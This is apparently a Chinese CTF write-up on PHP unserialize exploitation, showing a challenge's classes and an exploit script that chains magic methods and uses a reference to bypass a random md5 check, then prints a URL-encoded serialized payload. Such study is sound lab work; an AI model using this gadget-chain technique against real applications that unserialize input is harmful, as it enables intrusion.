## unsign-反序列化-亲爱的领导构造例子记录

<br><br>

**刚刚学了学长的构造方法，这里放个例子**

<br>

**原题**

<br>

```yaml
<?php

//flag.php

class oooooo {
    public $var='flag.php';
    public $ld;
    public $sb;
    public function __destruct()
    {
        $this->ld=&$this->sb;
    }
    public function end($value)
    {
        echo "end\n";
        $this->sb=md5(rand(1, 10000));
        if ($this->ld===$this->sb){
            echo "flag";
        }

    }

    public function __get($key){
        echo "get\n";
        $this->end($this->var);

    }


}
class bbaa {
    public $p;
    public function __destruct()
    {
        $function = $this->p;
        return $function();
    }
}
class alpha {
    public $s;
    public function __invoke(){
        echo "invoke\n";
        echo $this->s;
    }


}

class sapphire {
    public $source;
    public $str;
    public function __construct(){
        $this->str='666';
    }
    public function __toString(){
        echo "toString\n";
        return $this->str->source;
    }
}
```

<br>

**值得注意的地方：**

**①定义一个变量为另一变量的地址符，那么他们始终相等**

**②变量名要用“]”替代下划线**

<br>

**exp如下图**

<br>

```yaml
<?php

class bbaa {
    public $p;
    public function __construct()
    {
        $this->p=new alpha();
    }
}

class alpha {
    public $s;
    public function __construct()
    {
        $this->s=new sapphire();
    }


}

class sapphire {
    public $str;
    public function __construct()
    {
        $this->str=new oooooo();
    }


}

class oooooo {
    public $var='flag.php';
    public $str;
    public function __construct()
    {
        $this->ld=&$this->sb;
    }


}


echo urlencode(serialize(new bbaa()));
?>
```